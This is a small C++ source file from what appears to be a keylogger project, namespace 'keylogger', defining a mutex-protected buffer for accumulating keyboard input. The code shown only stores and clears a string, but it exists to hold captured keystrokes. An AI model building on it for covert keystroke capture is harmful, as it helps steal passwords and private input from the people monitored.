#include "KeyboardInput.h"

namespace keylogger
{
std::string KeyboardInput::keyboardInput = {};
std::mutex KeyboardInput::lock = {};

void KeyboardInput::appendToInput(const std::string& data)
{
    std::lock_guard<std::mutex> lockGuard(lock);
    keyboardInput += data;
}

std::string KeyboardInput::getInput()
{
    std::lock_guard<std::mutex> lockGuard(lock);
    return keyboardInput;
}

void KeyboardInput::clearInput()
{
    std::lock_guard<std::mutex> lockGuard(lock);
    keyboardInput.clear();
}

bool KeyboardInput::isEmpty()
{
    return keyboardInput.empty();
}
}